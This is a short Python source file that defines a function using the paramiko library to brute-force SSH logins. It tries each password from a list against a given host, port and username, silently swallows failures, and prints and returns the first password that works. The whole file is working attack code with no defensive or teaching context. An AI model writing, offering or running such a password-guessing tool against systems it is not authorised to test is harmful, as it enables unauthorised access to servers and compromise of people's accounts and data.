import paramiko


def brute_force_ssh(host, port, username, password_list):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for password in password_list:
        try:
            ssh.connect(host, port=port, username=username, password=password.strip(), timeout=3)
            print(f"[+] Success: {username}:{password.strip()}")
            return password.strip()
        except:
            pass
    return None
